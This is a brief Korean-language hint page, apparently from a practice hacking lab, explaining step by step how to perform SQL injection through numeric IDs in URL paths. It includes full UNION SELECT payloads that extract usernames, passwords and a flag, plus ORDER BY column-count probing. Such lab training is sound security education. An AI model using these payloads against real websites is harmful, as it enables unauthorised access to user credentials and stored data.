💡 이 페이지의 핵심: URL의 숫자(ID)로 SQL Injection 하기 (Level 3)

현실에서 가장 많이 보는 패턴입니다. /post/1, /view?id=5, /product/42 같은 곳이 전부 이 유형입니다.

공격 단계
  1. 주소창 끝에 ' 를 붙여 에러를 유발해보세요.
    예: /post/1'
  2. 에러 메시지에서 컬럼 수와 구조를 파악하세요.
  3. 아래처럼 UNION 공격을 URL에 직접 넣어보세요:
/post/1' UNION SELECT 1,username,password,4,5,6 FROM users--
/post/1 AND 1=2 UNION SELECT id,owner,secret,flag,5,6 FROM secrets--

컬럼 수를 모르겠다면? 먼저 ' ORDER BY 1--, ' ORDER BY 2-- ... 로 숫자를 올려가며 테스트하세요.

에러가 나는 순간의 직전 숫자가 컬럼 개수입니다.
